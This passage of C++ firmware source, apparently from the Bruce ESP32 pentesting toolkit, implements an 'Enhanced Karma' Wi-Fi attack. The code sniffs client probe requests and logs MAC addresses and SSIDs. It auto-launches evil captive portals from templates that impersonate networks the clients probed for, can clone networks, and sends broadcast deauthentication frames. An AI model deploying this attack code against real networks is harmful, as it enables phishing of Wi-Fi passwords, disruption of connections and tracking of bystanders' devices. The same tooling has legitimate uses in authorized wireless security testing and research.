        tft.print("Karma: " + String(karmaResponsesSent));

        tft.setCursor(10, tftHeight - 45);
        tft.print("Portals: " + String(autoPortalsLaunched));

        tft.setCursor(10, tftHeight - 35);
        tft.print("Clones: " + String(cloneAttacksLaunched));

        // Right column
        tft.setCursor(tftWidth/2, tftHeight - 75);
        tft.print("Pending: " + String(pendingPortals.size()));

        tft.setCursor(tftWidth/2, tftHeight - 65);
        tft.print("Ch: " + String(all_wifi_channels[channl]));

        tft.setCursor(tftWidth/2, tftHeight - 55);
        String hopStatus = String(auto_hopping ? "A:" : "M:") + String(hop_interval) + "ms";
        tft.print(hopStatus);

        tft.setCursor(tftWidth/2, tftHeight - 45);
        String tierText = "Tier: ";
        switch(attackConfig.defaultTier) {
            case TIER_CLONE: tierText += "Clone"; break;
            case TIER_HIGH: tierText += "High"; break;
            case TIER_MEDIUM: tierText += "Med"; break;
            case TIER_FAST: tierText += "Fast"; break;
            default: tierText += "None"; break;
        }
        tft.print(tierText);

        if (templateSelected && !selectedTemplate.name.isEmpty()) {
            tft.fillRect(10, tftHeight - 85, tftWidth - 20, 10, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight - 85);
            String templateText = "Template: " + selectedTemplate.name;
            if (templateText.length() > 40) {
                templateText = templateText.substring(0, 37) + "...";
            }
            tft.print(templateText);
        }

        // Show active portal if any
        if (isPortalActive && !pendingPortals.empty()) {
            tft.fillRect(10, tftHeight - 95, tftWidth - 20, 10, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight - 95);
            String attackText = "Attacking: " + pendingPortals[0].ssid;
            if (attackText.length() > 40) {
                attackText = attackText.substring(0, 37) + "...";
            }
            tft.print(attackText);
        }
    }
}

//===== SETUP =====//

void safe_wifi_deinit() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    vTaskDelay(100 / portTICK_PERIOD_MS);
}

void karma_setup() {
    // Clean shutdown if previous WiFi was active
    if (esp_wifi_stop() == ESP_OK) { safe_wifi_deinit(); }

    delay(200);

    FS *Fs;
    int redraw = true;
    String FileSys = "LittleFS";

    // STEP 1: Show template selection FIRST
    drawMainBorderWithTitle("KARMA ATTACK SETUP");
    displayTextLine("Select portal template:");
    delay(1000);

    // Force template selection before starting
    if (!selectPortalTemplate()) {
        // User skipped or no templates
        drawMainBorderWithTitle("KARMA SETUP");
        displayTextLine("Starting without portal...");
        delay(1000);
    }

    // STEP 2: Continue with normal setup
    drawMainBorderWithTitle("ENHANCED KARMA ATK");

    if (setupSdCard()) {
        Fs = &SD;
        FileSys = "SD";
        is_LittleFS = false;
        filen = generateUniqueFilename(SD, false);
    } else {
        Fs = &LittleFS;
        filen = generateUniqueFilename(LittleFS, false);
    }

    if (!Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");

    displayTextLine("Enhanced Karma Started");
    tft.setTextSize(FP);
    tft.setCursor(80, 100);

    initMACCache();
    clearProbes();

    // Configure Karma based on template selection
    karmaConfig.enableAutoKarma = true;
    karmaConfig.enableDeauth = false;
    karmaConfig.enableSmartHop = true;
    karmaConfig.prioritizeVulnerable = true;
    karmaConfig.enableAutoPortal = templateSelected; // Only auto-portal if template selected
    karmaConfig.maxClients = MAX_CLIENT_TRACK;

    // Configure attack strategy
    attackConfig.defaultTier = TIER_HIGH;
    attackConfig.enableCloneMode = true;
    attackConfig.enableTieredAttack = true;
    attackConfig.priorityThreshold = 60;
    attackConfig.cloneThreshold = 5;

    nvs_flash_init();
    ESP_ERROR_CHECK(esp_netif_init());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    cfg.rx_ba_win = 16;
    cfg.nvs_enable = false;

    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(all_wifi_channels[channl], secondCh);

    Serial.println("Enhanced karma attack started!");
    vTaskDelay(1000 / portTICK_RATE_MS);

    if (is_LittleFS && !checkLittleFsSize()) goto Exit;

    for (;;) {
        if (returnToMenu) {
            if (!checkLittleFsSize()) {
                Serial.println("Not enough space on LittleFS");
                displayError("LittleFS Full", true);
            }
            break;
        }

        unsigned long currentTime = millis();

        if (karmaConfig.enableSmartHop) {
            smartChannelHop();
        }

        if (karmaConfig.enableDeauth && (currentTime - lastDeauthTime > DEAUTH_INTERVAL)) {
            sendDeauth("FF:FF:FF:FF:FF:FF", all_wifi_channels[channl], true);
            lastDeauthTime = currentTime;
        }

        // Check for clone attack opportunities
        checkCloneAttackOpportunities();

        // Check and launch pending portals
        checkPendingPortals();

        if (check(NextPress)) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            channl++;
            if (channl >= sizeof(all_wifi_channels)) channl = 0;
            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
            esp_wifi_set_channel(all_wifi_channels[channl], secondCh);
            redraw = true;
            vTaskDelay(50 / portTICK_RATE_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
        }

        if (PrevPress) {
#if !defined(HAS_KEYBOARD) && !defined(HAS_ENCODER)
            LongPress = true;
            long _tmp = millis();
            while (PrevPress) {
                if (millis() - _tmp > 150)
                    tft.drawArc(
                        tftWidth / 2,
                        tftHeight / 2,
                        25,
                        15,
                        0,
                        360 * (millis() - _tmp) / 700,
                        getColorVariation(bruceConfig.priColor),
                        bruceConfig.bgColor
                    );
                vTaskDelay(10 / portTICK_RATE_MS);
            }
            LongPress = false;
            if (millis() - _tmp > 700) {
                returnToMenu = true;
                break;
            }
#endif
            check(PrevPress);
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            if (channl > 0) channl--;
            else channl = sizeof(all_wifi_channels) - 1;
            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
            esp_wifi_set_channel(all_wifi_channels[channl], secondCh);
            redraw = true;
            vTaskDelay(50 / portTICK_PERIOD_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
        }

#if defined(HAS_KEYBOARD) || defined(T_EMBED)
        if (check(EscPress)) {
            returnToMenu = true;
            break;
        }
#endif

        if (check(SelPress) || redraw || redrawNeeded) {
            vTaskDelay(200 / portTICK_PERIOD_MS);
            if (!redraw && !redrawNeeded) {
                std::vector<Option> options = {
                    {"Karma Attack",
                     [=]() {
                         std::vector<ClientBehavior> vulnerable = getVulnerableClients();
                         std::vector<ProbeRequest> uniqueProbes = getUniqueProbes();

                         std::vector<Option> karmaOptions;

                         for (const auto &client : vulnerable) {
                             if (!client.probedSSIDs.empty()) {
                                 String itemText = client.mac.substring(9) + " (VULN)";
                                 karmaOptions.push_back({itemText.c_str(), [=]() {
                                     // Manual portal launch with template settings
                                     launchManualEvilPortal(client.probedSSIDs[0], 
                                                           client.favoriteChannel, 
                                                           selectedTemplate.verifyPassword);
                                 }});
                             }
                         }

                         for (const auto &probe : uniqueProbes) {
                             String itemText = probe.ssid + " (" + String(probe.rssi) + "|ch " + String(probe.channel) + ")";
                             karmaOptions.push_back({itemText.c_str(), [=]() {
                                 // Manual portal launch
                                 launchManualEvilPortal(probe.ssid, probe.channel, 
                                                       selectedTemplate.verifyPassword);
                             }});
                         }

                         karmaOptions.push_back({"Back", [=]() {}});
                         loopOptions(karmaOptions);
                     }},

                    {"Select Template",
                     [=]() {
                         std::vector<Option> templateOptions;

                         for (const auto &tmpl : portalTemplates) {
                             String displayName = tmpl.name;
                             if (tmpl.isDefault) displayName = "[D] " + displayName;
                             if (tmpl.verifyPassword) displayName += " (verify)";

                             templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
                                 selectedTemplate = tmpl;
                                 templateSelected = true;
                                 karmaConfig.enableAutoPortal = true;
                                 displayTextLine("Template: " + tmpl.name);
                                 delay(1000);
                             }});
                         }

                         templateOptions.push_back({"Disable Auto-Portal", [=]() {
                             karmaConfig.enableAutoPortal = false;
                             templateSelected = false;
                             displayTextLine("Auto-portal disabled");
                             delay(1000);
                         }});

                         templateOptions.push_back({"Reload Templates", [=]() {
                             loadPortalTemplates();
                             displayTextLine("Templates reloaded");
                             delay(1000);
                         }});

                         templateOptions.push_back({"Back", [=]() {}});
                         loopOptions(templateOptions);
                     }},

                    {"Attack Strategy",
                     [=]() {
                         std::vector<Option> strategyOptions = {
                             {attackConfig.defaultTier == TIER_CLONE ? "* Clone Mode" : "- Clone Mode",
                              [=]() {
                                  attackConfig.defaultTier = TIER_CLONE;
                                  displayTextLine("Clone mode enabled");
                                  delay(1000);
                              }},
                             {attackConfig.defaultTier == TIER_HIGH ? "* High Tier" : "- High Tier",
                              [=]() {
                                  attackConfig.defaultTier = TIER_HIGH;
                                  displayTextLine("High tier mode");
                                  delay(1000);
                              }},
                             {attackConfig.defaultTier == TIER_MEDIUM ? "* Medium Tier" : "- Medium Tier",
                              [=]() {
                                  attackConfig.defaultTier = TIER_MEDIUM;
                                  displayTextLine("Medium tier mode");
                                  delay(1000);
                              }},
                             {attackConfig.defaultTier == TIER_FAST ? "* Fast Tier" : "- Fast Tier",
                              [=]() {
                                  attackConfig.defaultTier = TIER_FAST;
                                  displayTextLine("Fast tier mode");
                                  delay(1000);
                              }},
                             {attackConfig.enableCloneMode ? "* Clone Detection" : "- Clone Detection",
                              [=]() {
                                  attackConfig.enableCloneMode = !attackConfig.enableCloneMode;
                                  displayTextLine(attackConfig.enableCloneMode ? 
                                                 "Clone detection ON" : "Clone detection OFF");
                                  delay(1000);
                              }},
                             {attackConfig.enableTieredAttack ? "* Tiered Attack" : "- Tiered Attack",
                              [=]() {
                                  attackConfig.enableTieredAttack = !attackConfig.enableTieredAttack;
                                  displayTextLine(attackConfig.enableTieredAttack ? 
                                                 "Tiered attack ON" : "Tiered attack OFF");
                                  delay(1000);
                              }},
                             {"Back", [=]() {}}
                         };
                         loopOptions(strategyOptions);
                     }},

                    {"Save Probes",
                     [=]() {
                         if (is_LittleFS) saveProbesToFile(LittleFS, true);
                         else saveProbesToFile(SD, true);
                         displayTextLine("Probes saved!");
                     }},

                    {"Clear Probes",
                     [=]() {
                         clearProbes();
                         displayTextLine("Probes cleared!");
                     }},

                    {karmaConfig.enableAutoKarma ? "* Auto Karma" : "- Auto Karma",
                     [=]() {
                         karmaConfig.enableAutoKarma = !karmaConfig.enableAutoKarma;
                         displayTextLine(karmaConfig.enableAutoKarma ? "Auto Karma: ON" : "Auto Karma: OFF");
                     }},

                    {karmaConfig.enableAutoPortal ? "* Auto Portal" : "- Auto Portal",
                     [=]() {
                         if (!templateSelected) {
                             displayTextLine("Select template first!");
                             delay(1000);
                             return;
                         }
                         karmaConfig.enableAutoPortal = !karmaConfig.enableAutoPortal;
                         displayTextLine(karmaConfig.enableAutoPortal ? "Auto Portal: ON" : "Auto Portal: OFF");
                     }},

                    {karmaConfig.enableDeauth ? "* Deauth" : "- Deauth",
                     [=]() {
                         karmaConfig.enableDeauth = !karmaConfig.enableDeauth;
                         displayTextLine(karmaConfig.enableDeauth ? "Deauth: ON" : "Deauth: OFF");
                     }},

                    {karmaConfig.enableSmartHop ? "* Smart Hop" : "- Smart Hop",
                     [=]() {
                         karmaConfig.enableSmartHop = !karmaConfig.enableSmartHop;
                         displayTextLine(karmaConfig.enableSmartHop ? "Smart Hop: ON" : "Smart Hop: OFF");
                     }},

                    {auto_hopping ? "* Auto Hop" : "- Auto Hop",
                     [=]() {
                         auto_hopping = !auto_hopping;
                         displayTextLine(auto_hopping ? "Auto Hop: ON" : "Auto Hop: OFF");
                     }},

                    {hop_interval == FAST_HOP_INTERVAL ? "* Fast Hop" : "- Fast Hop",
                     [=]() {
                         hop_interval =
                             (hop_interval == FAST_HOP_INTERVAL) ? DEFAULT_HOP_INTERVAL : FAST_HOP_INTERVAL;
                         displayTextLine(
                             hop_interval == FAST_HOP_INTERVAL ? "Fast Hop: ON" : "Fast Hop: OFF"
                         );
                     }},

                    {"Show Stats",
                     [=]() {
                         drawMainBorderWithTitle("KARMA STATS");

                         int y = 40;
                         tft.setTextSize(1);

                         tft.setCursor(10, y); y += 15;
                         tft.print("Total Probes: " + String(totalProbes));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Unique Clients: " + String(uniqueClients));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Karma Responses: " + String(karmaResponsesSent));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Auto Portals: " + String(autoPortalsLaunched));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Clone Attacks: " + String(cloneAttacksLaunched));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Deauth Packets: " + String(deauthPacketsSent));

                         tft.setCursor(10, y); y += 15;
                         int vulnCount = 0;
                         for (const auto &clientPair : clientBehaviors) {
                             if (clientPair.second.isVulnerable) vulnCount++;
                         }
                         tft.print("Vulnerable: " + String(vulnCount));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Pending Attacks: " + String(pendingPortals.size()));

                         tft.setCursor(10, y); y += 15;
                         tft.print("Best Channel: " + String(getBestChannel()));

                         tft.setCursor(10, y); y += 15;
                         if (templateSelected) {
                             tft.print("Template: " + selectedTemplate.name);
                         } else {
                             tft.print("Template: None");
                         }

                         tft.setCursor(10, y); y += 15;
                         String tierName = "";
                         switch(attackConfig.defaultTier) {
                             case TIER_CLONE: tierName = "Clone"; break;
                             case TIER_HIGH: tierName = "High"; break;
                             case TIER_MEDIUM: tierName = "Medium"; break;
                             case TIER_FAST: tierName = "Fast"; break;
                             default: tierName = "None"; break;
                         }
                         tft.print("Attack Tier: " + tierName);

                         while (!check(SelPress) && !check(EscPress)) {
                             delay(50);
                         }
                         redrawNeeded = true;
                     }},

                    {"Exit Sniffer", [=]() { returnToMenu = true; }},
                };
                loopOptions(options);
            }

            if (returnToMenu) goto Exit;
            redraw = false;
            redrawNeeded = false;
            tft.drawPixel(0, 0, 0);
            drawMainBorderWithTitle("ENHANCED KARMA ATK");
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("Saved to " + FileSys);
            padprintln("Enhanced Karma Active");
            if (templateSelected) {
                padprintln("Template: " + selectedTemplate.name);
            } else {
                padprintln("Template: None");
            }
            padprintln(String(BTN_ALIAS) + ": Enhanced Menu");
            tft.drawRightString(
                "Ch." +
                    String(
                        all_wifi_channels[channl] < 10    ? "  "
                        : all_wifi_channels[channl] < 100 ? " "
                                                          : ""
                    ) +
                    String(all_wifi_channels[channl]) + "(Next)",
                tftWidth - 10,
                tftHeight - 18,
                1
            );
        }

        updateKarmaDisplay();

        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

Exit:
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    vTaskDelay(1 / portTICK_RATE_MS);

    if (macRingBuffer) {
        vRingbufferDelete(macRingBuffer);
        macRingBuffer = NULL;
    }
}

void saveProbesToFile(FS &fs, bool compressed) {
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");

    if (compressed) {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.write('K');
            file.write('R');
            file.write('M');
            file.write(0x02);

            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
            uint16_t count16 = (uint16_t)count;
            file.write((uint8_t*)&count16, 2);

            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];

                uint32_t timestamp = probe.timestamp;
                file.write((uint8_t*)&timestamp, 4);
                file.write((uint8_t*)probe.mac.c_str(), 17);
                int8_t rssi = (int8_t)probe.rssi;
                file.write((uint8_t*)&rssi, 1);
                file.write((uint8_t*)&probe.channel, 1);

                uint8_t ssidLen = (uint8_t)probe.ssid.length();
                file.write(&ssidLen, 1);
                if (ssidLen > 0) {
                    file.write((uint8_t*)probe.ssid.c_str(), ssidLen);
                }
            }
            file.close();
            Serial.println("[KARMA] Probes saved in compressed format");
        }
    } else {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.println("Timestamp,MAC,RSSI,Channel,SSID");
            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;

            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];

                if (probe.ssid.length() > 0) {
                    file.printf(
                        "%lu,%s,%d,%d,\"%s\"\n", 
                        probe.timestamp, 
                        probe.mac.c_str(), 
                        probe.rssi, 
                        probe.channel, 
                        probe.ssid.c_str()
                    );
                }
            }
            file.close();
            Serial.println("[KARMA] Probes saved in CSV format");
        }
    }
}